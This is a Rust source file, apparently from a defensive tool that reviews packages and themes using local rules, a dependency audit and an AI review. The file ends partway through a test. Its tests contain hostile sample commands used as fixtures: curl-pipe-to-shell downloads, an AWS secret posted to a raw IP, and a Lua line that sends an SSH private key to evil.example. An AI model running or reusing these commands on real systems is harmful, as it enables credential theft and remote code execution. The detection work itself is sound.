//! The review pipeline shared by every command: local rules, dependency
//! audit, then the OpenCode review through the review engine.

use std::collections::{HashMap, HashSet};
use std::path::Path;

use crate::agent::{SourceFile, Status};
use crate::config::Settings;
use crate::config::model::{AgentSettings, AiRequirement, Named, SourceClass};
use crate::content::Format;
use crate::deps;
use crate::engine::baseline::{Identity, Unit};
use crate::engine::plan::HashOnly;
use crate::engine::{self, Group, Memory};
use crate::git_state;
use crate::image;
use crate::mask;
use crate::osv;
use crate::report::{AgentOutcome, Decision, Gap, LocalFinding, NetworkRequest, Report, RunRef};
use crate::rules::{self, RuleId, Scheme};
use crate::scan::{self, FileHash, FileKind, ScanConfig, TextFile};
use crate::tools::OpenCode;

const EXCERPT_CHARS: usize = 180;
const LFS_POINTER: &str = "version https://git-lfs.github.com/spec/v1";

/// What one review runs against: the settings, the class the target itself
/// belongs to, and where to find OpenCode.
pub struct ReviewContext<'a> {
    pub settings: &'a Settings,
    pub class: SourceClass,
    pub opencode: &'a OpenCode,
    /// What the target is remembered as; empty for `<class>:<canonical path>`.
    pub units: &'a [Unit],
    /// The review-memory store; `None` reviews without it.
    pub state_root: Option<&'a Path>,
    /// Facts for the AI review (see `Request::context`).
    pub context: &'a [String],
}

/// Reviews a file or directory tree as one source class.
pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
    let mut report = collected_report(config.root.display().to_string(), context);

    let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
        if file.lossy {
            report.lossy_files += 1;
        }
        if file.git_config {
            // Checked as git reads it, and reviewed like any file (it may
            // be run as something else) without the tokens it may hold.
            git_config_findings(&mut report, file.rel, file.text);
            let masked = git_state::without_url_credentials(file.text);
            analyze_text(&mut report, file.rel, &masked, true);
        } else {
            analyze_text(&mut report, file.rel, file.text, true);
        }
    });
    report.hash_only = snapshot
        .files()
        .iter()
        .filter_map(|file| {
            file.format.map(|format| HashOnly {
                path: file.path.clone(),
                bytes: file.bytes,
                label: format.label(),
                media: format.is_media(),
                skipped_files: None,
            })
        })
        .chain(snapshot.skipped().iter().map(|skipped| HashOnly {
            path: skipped.path.clone(),
            bytes: 0,
            label: "generated directory, not reviewed",
            media: false,
            skipped_files: Some(skipped.files),
        }))
        .collect();
    report.unread = snapshot
        .files()
        .iter()
        .filter(|file| !is_plain_image(&config.root, file))
        .map(|file| (file.path.clone(), file.sha256.to_string()))
        // Nobody hashed a skipped directory: without a digest it is never
        // recorded, so a tree with one is always reviewed in full.
        .chain(
            snapshot
                .skipped()
                .iter()
                .map(|skipped| (format!("{}/", skipped.path), String::new())),
        )
        .collect();
    let unread: Vec<(String, String)> = report
        .hash_only
        .iter()
        .filter(|file| file.skipped_files.is_none())
        .map(|file| (file.path.clone(), file.label.to_string()))
        .collect();
    check_runs(&mut report, &unread);
    report.snapshot = snapshot;
    report.gaps.extend(walk_gaps);
    if report.text_files_reviewed == 0 {
        report.gaps.push(Gap::NoReviewableFiles);
    }

    audit_dependencies(&mut report);
    let units = if context.units.is_empty() {
        default_units(context.class, &config.root)
    } else {
        context.units.to_vec()
    };
    review_collected(report, context, &units)
}

/// A report for files collected outside a tree walk (see `review_collected`).
pub fn collected_report(subject: impl Into<String>, context: &ReviewContext<'_>) -> Report {
    let mut report = Report::new(subject);
    report.class = context.class;
    report.profile = context
        .settings
        .profile_for(context.class)
        .name()
        .to_string();
    report.ai_off_classes = ai_off_classes(context.settings, &[context.class]);
    report
}

/// An image by its name and by its whole content, not marked to run: a
/// wallpaper, an icon. Nothing loads such a file as code by its name, and
/// the review of the text beside it reports code that runs or sources a
/// file it was not sent, so a new or changed one needs no new review.
/// Reviewed text is not unread either; everything else is.
fn is_plain_image(root: &Path, file: &FileHash) -> bool {
    file.kind == FileKind::Text
        || (file.kind == FileKind::Binary
            && !file.executable
            && file.format.is_some_and(Format::is_media)
            && image::is_named(&file.path)
            && image::is_whole_file(&root.join(&file.path), &file.sha256))
}

/// Runs the AI review of what `report` has queued, with the review memory
/// for `units`, and records an approved baseline.
pub fn review_collected(mut report: Report, context: &ReviewContext<'_>, units: &[Unit]) -> Report {
    report.context = context.context.to_vec();
    let memory = match Memory::open(
        context.settings,
        context.class,
        units.to_vec(),
        context.state_root.map(Path::to_path_buf),
    ) {
        Ok(memory) => memory,
        Err(reason) => {
            report
                .notes
                .push(format!("not used ({reason}); reviewing in full"));
            None
        }
    };
    let reviewed_with = run_agents(
        &mut report,
        context.settings,
        context.opencode,
        units,
        memory.as_ref(),
    );
    if let Some(memory) = &memory {
        let approved = reviewed_with
            .as_ref()
            .filter(|_| is_approved(&report, context.settings))
            .map(|settings| (report.agent_input.as_slice(), settings));
        let notes = engine::remember(memory, approved, &report.unread);
        report.notes.extend(notes);
    }
    report
}

/// The subset of `classes` whose resolved policy has `ai = off`.
pub fn ai_off_classes(settings: &Settings, classes: &[SourceClass]) -> Vec<SourceClass> {
    classes
        .iter()
        .copied()
        .filter(|class| settings.policy(*class).ai == AiRequirement::Off)
        .collect()
}

/// Checks a `.git/config` for keys that make git run a command. It is
/// never sent to the AI: remote addresses can carry tokens.
fn analyze_git_config(report: &mut Report, rel: &str, text: &str) {
    report.text_files_reviewed += 1;
    git_config_findings(report, rel, text);
}

/// The keys of a git configuration that make git run a command, as findings.
fn git_config_findings(report: &mut Report, rel: &str, text: &str) {
    for (line, excerpt) in git_state::executing_keys(text) {
        report.findings.push(LocalFinding {
            path: rel.to_string(),
            line,
            rule: RuleId::GitConfigCommand,
            excerpt: excerpt.chars().take(EXCERPT_CHARS).collect(),
        });
    }
}

/// Applies the local checks to one text file and queues it for the AI review.
pub fn analyze_text(report: &mut Report, rel: &str, text: &str, inspect_dependencies: bool) {
    if git_state::is_git_config(rel) {
        return analyze_git_config(report, rel, text);
    }
    report.text_files_reviewed += 1;

    if text.lines().next() == Some(LFS_POINTER) {
        report.gaps.push(Gap::UnresolvedLfs(rel.to_string()));
    }
    queue_for_agent(report, rel, text);

    let documentation = rules::is_documentation(rel);
    let inventory_network = !documentation && rules::is_executable_or_runtime_config(rel);
    if !documentation {
        apply_rules(report, rel, text, inventory_network);
    }

    if inspect_dependencies {
        deps::inspect(&mut report.dependencies, &mut report.gaps, rel, text);
    }
}

/// Queues a package payload file that acts on its own (see `payload`) for
/// the AI review only. The local rules are written for scripts and code;
/// these files are where legitimate services, rules and privileges live, so
/// the rules' matches on them are noise. Returns whether it was queued: a
/// class with `ai = off` does not review payload files at all.
pub fn analyze_payload(report: &mut Report, rel: &str, text: &str) -> bool {
    if report.ai_off_classes.contains(&report.class_of(rel)) {
        return false;
    }
    report.text_files_reviewed += 1;
    queue_for_agent(report, rel, text);
    true
}

fn queue_for_agent(report: &mut Report, rel: &str, text: &str) {
    if report.ai_off_classes.contains(&report.class_of(rel)) {
        return;
    }
    if rules::is_sensitive_path(rel) {
        report.gaps.push(Gap::SensitiveWithheld(rel.to_string()));
        return;
    }
    report.agent_input.push(SourceFile {
        path: rel.to_string(),
        content: text.to_string(),
    });
}

/// Records the destinations in `active`, the line without comments and
/// printed messages; `line` is the original, shown as the excerpt.
fn record_network(report: &mut Report, rel: &str, number: usize, line: &str, active: &str) {
    for (scheme, host) in rules::extract_network_destinations(active) {
        if !rules::is_local_host(&host) {
            if scheme == Scheme::Http {
                push_finding(report, rel, number, line, RuleId::CleartextNetworkRequest);
            }
            if rules::is_ip_host(&host) {
                push_finding(report, rel, number, line, RuleId::DirectIpNetworkRequest);
            }
        }
        report.network.push(NetworkRequest {
            path: rel.to_string(),
            line: number,
            scheme,
            host,
        });
    }
}

/// The most downloaded files followed through one file.
const MAX_FETCHED_FILES: usize = 64;

/// Runs the local rules over `text`: each line by itself, each command
/// continued over several lines as the one line a shell reads, and a
/// download saved to a file that the same text later runs.
fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bool) {
    let masked = mask::lines(rel, text);
    let lines: Vec<&str> = text.lines().collect();
    let variables = rules::command_variables(text);
    // Each line lowercased for the rules, and as written for file names.
    let mut views: Vec<(String, String)> = Vec::with_capacity(lines.len());
    let mut written: Vec<String> = Vec::with_capacity(lines.len());
    for (index, (line, view)) in lines.iter().zip(&masked).enumerate() {
        let number = index + 1;
        if inventory_network {
            record_network(report, rel, number, line, &view.quiet);
        }
        // Tabs as spaces, so `sudo<TAB>x` matches like `sudo x`.
        let as_written = view.code.replace('\t', " ");
        let code = rules::with_variables(&as_written.to_lowercase(), &variables);
        let quiet =
            rules::with_variables(&view.quiet.to_lowercase().replace('\t', " "), &variables);
        for rule in rules::line_rules(&code, &quiet) {
            push_finding(report, rel, number, line, rule);
        }
        views.push((code, quiet));
        written.push(as_written);
    }

    let joined = |parts: &mut dyn Iterator<Item = &String>| {
        parts
            .map(|part| part.trim_end().trim_end_matches('\\'))
            .collect::<Vec<_>>()
            .join(" ")
    };
    let mut fetched: Vec<String> = Vec::new();
    let mut start = 0;
    while start < views.len() {
        // The lines of one command: a blank or comment line after a pipe
        // or `&&` does not end it.
        let mut end = start + 1;
        let mut last = start;
        while end < views.len() {
            let open = views[last].0.trim_end();
            if views[end].0.trim().is_empty() && (open.ends_with('|') || open.ends_with("&&")) {
                end += 1;
            } else if rules::continues(&views[last].0, &views[end].0) {
                last = end;
                end += 1;
            } else {
                break;
            }
        }
        let end = last + 1;
        let group = &views[start..end];
        let code = joined(&mut group.iter().map(|(code, _)| code));
        let mut found: Vec<RuleId> = group
            .iter()
            .flat_map(|(code, quiet)| rules::line_rules(code, quiet))
            .collect();
        if group.len() > 1 {
            let quiet = joined(&mut group.iter().map(|(_, quiet)| quiet));
            for rule in rules::line_rules(&code, &quiet) {
                if !found.contains(&rule) {
                    found.push(rule);
                    push_finding(report, rel, start + 1, lines[start], rule);
                }
            }
        }
        let as_written = joined(&mut written[start..end].iter());
        record_runs(report, rel, start + 1, lines[start], &as_written);
        if let Some(file) = rules::fetched_file(&as_written) {
            let file = file.to_lowercase();
            if report.fetches.len() < MAX_RUNS {
                report.fetches.push((rel.to_string(), file.clone()));
            } else {
                report.runs_overflowed = true;
            }
            if !fetched.contains(&file) {
                // Past the limit the oldest is let go: a download is run
                // soon after it is made.
                if fetched.len() == MAX_FETCHED_FILES {
                    fetched.remove(0);
                }
                fetched.push(file);
            }
        }
        if !found.contains(&RuleId::DownloadAndExecute)
            && fetched
                .iter()
                .any(|file| code.contains(file.as_str()) && rules::runs_file(&code, file))
        {
            push_finding(
                report,
                rel,
                start + 1,
                lines[start],
                RuleId::DownloadAndExecute,
            );
        }
        start = end;
    }
}

/// Records what the command at `line` runs (see `check_runs`).
fn record_runs(report: &mut Report, rel: &str, line: usize, text: &str, command: &str) {
    let targets = rules::run_targets(command);
    if report.runs.len() + targets.len() > MAX_RUNS {
        report.runs_overflowed = true;
        return;
    }
    for target in targets {
        report.runs.push(RunRef {
            rel: rel.to_string(),
            line,
            excerpt: text.trim().chars().take(EXCERPT_CHARS).collect(),
            target,
        });
    }
}

/// The most files run, and downloads, recorded for one review. Past it the
/// review is incomplete: what runs further on is not followed.
pub const MAX_RUNS: usize = 100_000;

/// What one reviewed file does with another: runs one that a different
/// file downloads (download-and-run across files), or runs or reads in as
/// code one Guardian could not read as text (`unread`, with why), which is
/// then not reviewed although it runs.
pub fn check_runs(report: &mut Report, unread: &[(String, String)]) {
    if report.runs_overflowed {
        report.gaps.push(Gap::RunsUnread(format!(
            "more than {MAX_RUNS} lines run or download a file: the rest are not followed"
        )));
    }
    let runs = std::mem::take(&mut report.runs);
    // Which files download what, and which files Guardian could not read,
    // each looked up once.
    let mut downloaders: HashMap<String, HashSet<String>> = HashMap::new();
    for (rel, file) in &report.fetches {
        downloaders
            .entry(file.clone())
            .or_default()
            .insert(rel.clone());
    }
    let unread_by_path: HashMap<&str, &str> = unread
        .iter()
        .map(|(path, why)| (path.as_str(), why.as_str()))
        .collect();
    let flagged: HashSet<(String, usize)> = report
        .findings
        .iter()
        .filter(|finding| finding.rule == RuleId::DownloadAndExecute)
        .map(|finding| (finding.path.clone(), finding.line))
        .collect();
    let mut gapped: HashSet<(String, String)> = HashSet::new();
    let mut gaps = 0;
    for run in &runs {
        let downloaded_elsewhere = downloaders
            .get(&run.target.to_lowercase())
            .is_some_and(|rels| rels.iter().any(|rel| *rel != run.rel));
        if downloaded_elsewhere && !flagged.contains(&(run.rel.clone(), run.line)) {
            report.findings.push(LocalFinding {
                path: run.rel.clone(),
                line: run.line,
                rule: RuleId::DownloadAndExecute,
                excerpt: run.excerpt.clone(),
            });
        }
        // The file the line names: beside the file that runs it, or from
        // the top of the tree.
        let Some(path) = run_paths(&run.rel, &run.target)
            .into_iter()
            .find(|candidate| unread_by_path.contains_key(candidate.as_str()))
        else {
            continue;
        };
        if !gapped.insert((run.rel.clone(), path.clone())) {
            continue;
        }
        gaps += 1;
        if gaps > MAX_RUN_GAPS {
            continue;
        }
        let why = unread_by_path
            .get(path.as_str())
            .copied()
            .unwrap_or_default();
        report.gaps.push(Gap::RunsUnread(format!(
            "{}:{} runs or reads in {path} ({why}), which could not be reviewed as text",
            run.rel, run.line
        )));
    }
    if gaps > MAX_RUN_GAPS {
        report.gaps.push(Gap::RunsUnread(format!(
            "{} more files that run or read in what could not be reviewed",
            gaps - MAX_RUN_GAPS
        )));
    }
    report.runs = runs;
}

/// The most such gaps named one by one.
const MAX_RUN_GAPS: usize = 32;

/// The paths a `target` written in the file `rel` may name, relative to the
/// top of the tree: beside that file, and from the top.
fn run_paths(rel: &str, target: &str) -> Vec<String> {
    if target.contains('$') || target.starts_with('/') {
        return Vec::new();
    }
    let target = target.trim_start_matches("./");
    let directory = rel.rsplit_once('/').map_or("", |(directory, _)| directory);
    let beside = if directory.is_empty() {
        target.to_string()
    } else {
        format!("{directory}/{target}")
    };
    [beside, target.to_string()]
        .into_iter()
        .filter_map(|path| {
            let mut parts: Vec<&str> = Vec::new();
            for part in path.split('/') {
                match part {
                    "" | "." => {}
                    ".." => {
                        parts.pop()?;
                    }
                    other => parts.push(other),
                }
            }
            Some(parts.join("/"))
        })
        .collect()
}

fn push_finding(report: &mut Report, rel: &str, number: usize, line: &str, rule: RuleId) {
    report.findings.push(LocalFinding {
        path: rel.to_string(),
        line: number,
        rule,
        excerpt: line.trim().chars().take(EXCERPT_CHARS).collect(),
    });
}

fn audit_dependencies(report: &mut Report) {
    deps::check_coverage(&report.dependencies, &mut report.gaps);
    let packages = report.dependencies.packages();
    if packages.is_empty() {
        return;
    }
    match osv::audit(packages) {
        Ok(audit) => report.audit = Some(audit),
        Err(error) => report.gaps.push(Gap::Dependency(format!(
            "OSV dependency audit failed: {error}"
        ))),
    }
}

/// Runs the AI review for every file whose class policy wants one. Files
/// whose classes resolve to the same agent settings share one plan. A tree
/// with an oversized text file is already incomplete, so nothing is sent.
///
/// Returns the agent settings every queued file was reviewed with, or
/// `None` when nothing was reviewed or the files needed more than one set
/// of settings (a baseline is bound to one set, so such a review is never
/// recorded as one).
pub fn run_agents(
    report: &mut Report,
    settings: &Settings,
    opencode: &OpenCode,
    units: &[Unit],
    memory: Option<&Memory>,
) -> Option<AgentSettings> {
    let has_oversized = report.snapshot.count(FileKind::OversizedText) > 0;
    if report.agent_input.is_empty() || has_oversized {
        return None;
    }

    let mut groups: Vec<(AgentSettings, Vec<SourceFile>)> = Vec::new();
    for file in &report.agent_input {
        let class = report.class_of(&file.path);
        if settings.policy(class).ai == AiRequirement::Off {
            continue;
        }
        let agent_settings = settings.agent_settings(class);
        match groups
            .iter_mut()
            .find(|(existing, _)| *existing == agent_settings)
        {
            Some((_, files)) => files.push(file.clone()),
            None => groups.push((agent_settings, vec![file.clone()])),
        }
    }

    let reviewed_with = match groups.as_slice() {
        [(only, files)] if files.len() == report.agent_input.len() => Some(only.clone()),
        _ => None,
    };
    for (agent_settings, files) in groups {
        let findings: Vec<LocalFinding> = report
            .findings
            .iter()
            .filter(|finding| files.iter().any(|file| file.path == finding.path))
            .cloned()
            .collect();
        let group = Group {
            settings: &agent_settings,
            class: group_class(report, &files),
            files: &files,
            findings: &findings,
            units,
            context: &report.context,
            hash_only: &report.hash_only,
            unread: &report.unread,
        };
        let reviewed = engine::review_group(&group, opencode, memory);
        report.notes.extend(reviewed.notes);
        if let Some(path) = reviewed.entry_point_too_large {
            report.agent_input_overflowed = true;
            report.gaps.push(Gap::EntryPointTooLarge(path));
        } else if reviewed.too_large && !report.agent_input_overflowed {
            report.agent_input_overflowed = true;
            report.gaps.push(Gap::AgentInputTooLarge);
        }
        if let Some(error) = reviewed.invalid {
            report.gaps.push(Gap::Agent(error));
        }
        report.agent_runs.extend(reviewed.runs);
    }
    reviewed_with
}

/// The class a group is reviewed as: its files' class when they share one,
/// else the report's (the strictest pacman class for a transaction).
fn group_class(report: &Report, files: &[SourceFile]) -> SourceClass {
    let mut classes = files.iter().map(|file| report.class_of(&file.path));
    let first = classes.next().unwrap_or(report.class);
    if classes.all(|class| class == first) {
        first
    } else {
        report.class
    }
}

/// Without `--identity` or `--unit`, a target is remembered by its class
/// and canonical path.
fn default_units(class: SourceClass, root: &Path) -> Vec<Unit> {
    root.canonicalize()
        .ok()
        .and_then(|path| path.to_str().map(|path| format!("{}:{path}", class.name())))
        .and_then(|text| Identity::parse(&text).ok())
        .map(|identity| {
            vec![Unit {
                prefix: String::new(),
                identity,
            }]
        })
        .unwrap_or_default()
}

/// A baseline is recorded only when every chunk got a clear AI verdict, the
/// report has no gaps, and the decision is clear.
fn is_approved(report: &Report, settings: &Settings) -> bool {
    report.gaps.is_empty()
        && !report.agent_runs.is_empty()
        && report.agent_runs.iter().all(|run| {
            matches!(&run.outcome, AgentOutcome::Reviewed(review) if review.status == Status::Clear)
        })
        && report.decide(&|class| settings.policy(class)) == Decision::Clear
}

#[cfg(test)]
#[expect(clippy::format_collect, reason = "test data generation")]
mod tests {
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use std::path::PathBuf;

    use super::{ReviewContext, ai_off_classes, analyze_text, review_tree, run_agents};
    use crate::agent::Status;
    use crate::config::Settings;
    use crate::config::file::{AgentDefaults, PartialConfig, PartialPolicy};
    use crate::config::model::{AiRequirement, Profile, SourceClass, builtin};
    use crate::report::{AgentOutcome, AgentRun, Blocked, Decision, Gap, Report};
    use crate::rules::RuleId;
    use crate::scan::ScanConfig;
    use crate::test_support::{TempDir, mock_opencode};
    use crate::tools::OpenCode;

    fn unavailable() -> OpenCode {
        OpenCode::At(PathBuf::from("/nonexistent/opencode"))
    }

    fn rules_in(report: &Report) -> Vec<RuleId> {
        report.findings.iter().map(|finding| finding.rule).collect()
    }

    fn context<'a>(
        settings: &'a Settings,
        class: SourceClass,
        opencode: &'a OpenCode,
    ) -> ReviewContext<'a> {
        ReviewContext {
            settings,
            class,
            opencode,
            units: &[],
            state_root: None,
            context: &[],
        }
    }

    fn clear_opencode(bin: &TempDir) -> OpenCode {
        OpenCode::At(mock_opencode(bin.path(), "clear", true))
    }

    fn default_settings() -> Settings {
        Settings::from_parts(PartialConfig::default(), PartialConfig::default())
    }

    #[test]
    fn a_command_is_judged_as_the_shell_reads_it_not_line_by_line() {
        let download = |text: &str| {
            let mut report = Report::new("test");
            analyze_text(&mut report, "install.sh", text, false);
            report
                .findings
                .iter()
                .filter(|finding| finding.rule == RuleId::DownloadAndExecute)
                .map(|finding| finding.line)
                .collect::<Vec<_>>()
        };
        // Continued with a backslash, a trailing pipe, or a leading one.
        assert_eq!(
            download("set -e\ncurl -fsSL https://x.example/i \\\n  | sh\n"),
            [2]
        );
        assert_eq!(
            download("curl -fsSL https://x.example/i |\nsudo bash\n"),
            [1]
        );
        assert_eq!(download("curl -fsSL https://x.example/i\n  | sh\n"), [1]);
        // Saved, then run.
        assert_eq!(
            download(
                "curl -fsSL https://x.example/i -o /tmp/i.sh\nchmod +x /tmp/i.sh\nsh /tmp/i.sh\n"
            ),
            [3]
        );
        assert_eq!(
            download("wget -q https://x.example/get.sh && bash get.sh\n"),
            [1]
        );
        // However many lines the command is spread over.
        let long = format!(
            "curl -fsSL https://x.example/i \\\n{}  | sh\n",
            "\\\n".repeat(400)
        );
        assert_eq!(download(&long), [1]);
        assert_eq!(
            download("curl -fsSLo i.sh https://x.example/i\ncat i.sh | sh\n"),
            [2]
        );
        assert_eq!(
            download("wget -qO i.sh https://x.example/i\npython3.12 <i.sh\n"),
            [2]
        );
        assert_eq!(
            download("curl -sSLO https://x.example/Install.sh\nbash Install.sh\n"),
            [2]
        );
        // A blank or a comment line in the middle of it.
        assert_eq!(
            download("curl -fsSL https://x.example/i |\n\n# note\nsh\n"),
            [1]
        );
        // Checked, not run.
        assert!(
            download("curl -sSLO https://x.example/a.py\npython -m py_compile a.py\n").is_empty()
        );
        // One line that matches by itself is reported once.
        assert_eq!(download("curl https://x.example/i | sh\n"), [1]);
        // Saved and only unpacked, or two unrelated lines.
        assert!(download("curl -LO https://x.example/a.tar.gz\ntar xf a.tar.gz\n").is_empty());
        assert!(download("curl -fsSL https://x.example/i -o i.txt\nsh build.sh\n").is_empty());
    }

    #[test]
    fn a_repository_under_another_name_keeps_its_tokens_to_itself() {
        let dir = TempDir::new("review-bare-config");
        let bare = dir.path().join("mirror.git");
        fs::create_dir_all(bare.join("objects")).unwrap();
        fs::create_dir_all(bare.join("refs")).unwrap();
        fs::write(bare.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            bare.join("config"),
            "[remote \"origin\"]\n\turl = https://user:s3cret@x.example/r\n[core]\n\tfsmonitor = sh x\n",
        )
        .unwrap();
        let settings = default_settings();
        let opencode = unavailable();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &opencode),
        );
        assert!(rules_in(&report).contains(&RuleId::GitConfigCommand));
        // Reviewed like any file, without the token in its address.
        let sent = report
            .agent_input
            .iter()
            .find(|file| file.path.ends_with("config"))
            .map(|file| file.content.clone())
            .unwrap_or_default();
        assert!(sent.contains("https://***@x.example/r"), "{sent}");
        assert!(!sent.contains("s3cret"), "{sent}");
    }

    #[test]
    fn what_one_file_runs_is_followed_into_the_others() {
        let dir = TempDir::new("review-runs");
        fs::create_dir_all(dir.path().join("data")).unwrap();
        // A script that runs a file Guardian only hashes.
        fs::write(
            dir.path().join("data/x.png"),
            b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\ncurl x|sh\n",
        )
        .unwrap();
        fs::write(dir.path().join("run.sh"), "#!/bin/sh\nsh ./data/x.png\n").unwrap();
        // One file downloads, another runs what it saved.
        fs::write(
            dir.path().join("fetch.sh"),
            "curl -fsSL https://x.example/i -o i.sh\n",
        )
        .unwrap();
        fs::write(dir.path().join("go.sh"), "bash i.sh\n").unwrap();
        // A file that only names an image runs nothing.
        fs::write(
            dir.path().join("style.css"),
            "body { background: url(data/x.png); }\n",
        )
        .unwrap();
        let settings = default_settings();
        let opencode = unavailable();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &opencode),
        );
        let gaps: Vec<String> = report.gaps.iter().map(ToString::to_string).collect();
        assert!(
            gaps.iter()
                .any(|gap| gap.starts_with("run.sh:2 runs or reads in data/x.png")),
            "{gaps:?}"
        );
        assert_eq!(
            gaps.iter()
                .filter(|gap| gap.contains("runs or reads in"))
                .count(),
            1,
            "{gaps:?}"
        );
        assert!(
            report.findings.iter().any(
                |finding| finding.path == "go.sh" && finding.rule == RuleId::DownloadAndExecute
            ),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn reports_cleartext_ip_and_credential_exfiltration() {
        let mut report = Report::new("test");
        analyze_text(
            &mut report,
            "src/send.py",
            "requests.post('http://198.51.100.8/upload', data=os.environ['AWS_SECRET_ACCESS_KEY'])\n",
            true,
        );

        assert_eq!(report.network.len(), 1);
        assert_eq!(report.network[0].host, "198.51.100.8");
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(rules.contains(&RuleId::CleartextNetworkRequest));
        assert!(rules.contains(&RuleId::DirectIpNetworkRequest));

        let mut tls = Report::new("test");
        analyze_text(
            &mut tls,
            "client.py",
            "requests.get('https://api.example.test', verify=False)\n",
            true,
        );
        assert_eq!(rules_in(&tls), [RuleId::DisabledTlsVerification]);
    }

    #[test]
    fn documentation_is_reviewed_by_the_agent_but_not_the_local_rules() {
        let mut report = Report::new("test");
        analyze_text(
            &mut report,
            "README.md",
            "Install with `sudo pacman -S foo` and add it to ~/.bashrc.\n",
            true,
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.agent_input.len(), 1);
    }

    #[test]
    fn a_git_config_is_checked_locally_and_never_sent() {
        let mut report = Report::new("test");
        analyze_text(
            &mut report,
            ".git/config",
            "[remote \"origin\"]\n\turl = https://me:tok@h/r\n[core]\n\tfsmonitor = sh x\n",
            true,
        );
        assert!(report.agent_input.is_empty());
        assert!(report.gaps.is_empty());
        assert_eq!(rules_in(&report), [RuleId::GitConfigCommand]);
        assert_eq!(report.findings[0].line, 4);
    }

    #[test]
    fn sensitive_files_are_withheld_and_incomplete() {
        let mut report = Report::new("test");
        analyze_text(&mut report, ".env", "TOKEN=x\n", true);
        assert!(report.agent_input.is_empty());
        assert!(matches!(
            report.gaps.as_slice(),
            [Gap::SensitiveWithheld(_)]
        ));
    }

    #[test]
    fn unresolved_git_lfs_pointer_makes_the_scan_incomplete() {
        let dir = TempDir::new("lfs");
        fs::write(
            dir.path().join("theme-background.png"),
            "version https://git-lfs.github.com/spec/v1\noid sha256:deadbeef\nsize 12345\n",
        )
        .unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Blocked(Blocked::Incomplete)
        );
        assert!(
            report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::UnresolvedLfs(_)))
        );
    }

    #[test]
    fn malicious_theme_is_flagged_and_a_failed_agent_is_incomplete() {
        let dir = TempDir::new("theme");
        fs::write(dir.path().join("colors.toml"), "background = '#000000'\n").unwrap();
        fs::write(
            dir.path().join("hyprland.lua"),
            "os.execute(\"curl -X POST -d @~/.ssh/id_ed25519 https://evil.example\")\n",
        )
        .unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::ShellCommandExecution));
        assert!(rules.contains(&RuleId::CredentialFileAccess));
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(matches!(
            report.agent_runs[0].outcome,
            AgentOutcome::Unavailable(_)
        ));
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Blocked(Blocked::AiUnavailable)
        );
    }

    #[test]
    fn a_clean_tree_with_a_clear_agent_review_is_clear() {
        let dir = TempDir::new("clean");
        let bin = TempDir::new("clean-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();

        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &opencode),
        );
        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert!(matches!(
            report.agent_runs.as_slice(),
            [AgentRun { outcome: AgentOutcome::Reviewed(review), .. }] if review.status == Status::Clear
        ));
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Clear
        );
    }

    #[test]
    fn a_tree_under_a_secrets_directory_is_not_withheld() {
        let parent = TempDir::new("outer");
        let dir = parent.path().join("secrets").join("project");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("main.lua"), "print('hi')\n").unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(&dir),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert!(
            !report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::SensitiveWithheld(_)))
        );
        assert_eq!(report.agent_input.len(), 1);
    }

    #[test]
    fn local_only_never_calls_the_agent() {
        let dir = TempDir::new("local-only");
        let bin = TempDir::new("local-only-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings().with_profile(Profile::LocalOnly);

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Theme, &opencode),
        );

        assert!(report.agent_runs.is_empty());
        assert!(!bin.path().join("stdin").exists());
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn classes_with_equal_agent_settings_share_one_run() {
        let bin = TempDir::new("grouped-bin");
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings();

        let mut report = Report::new("transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report
            .file_classes
            .insert("a/.INSTALL".into(), SourceClass::Official);
        report
            .file_classes
            .insert("b/.INSTALL".into(), SourceClass::LocalPackage);
        report
            .file_classes
            .insert("c/.INSTALL".into(), SourceClass::ThirdPartyRepo);
        for path in ["a/.INSTALL", "b/.INSTALL", "c/.INSTALL"] {
            analyze_text(&mut report, path, "post_install() { true; }\n", false);
        }

        run_agents(&mut report, &settings, &opencode, &[], None);

        // Official uses low thinking; the other two share high thinking.
        assert_eq!(report.agent_runs.len(), 2);
        let files: Vec<&[String]> = report
            .agent_runs
            .iter()
            .map(|run| run.files.as_slice())
            .collect();
        assert!(files.contains(&&["a/.INSTALL".to_string()][..]));
    }

    #[test]
    fn ai_off_skips_agent_input_gaps() {
        let dir = TempDir::new("agent-disabled");
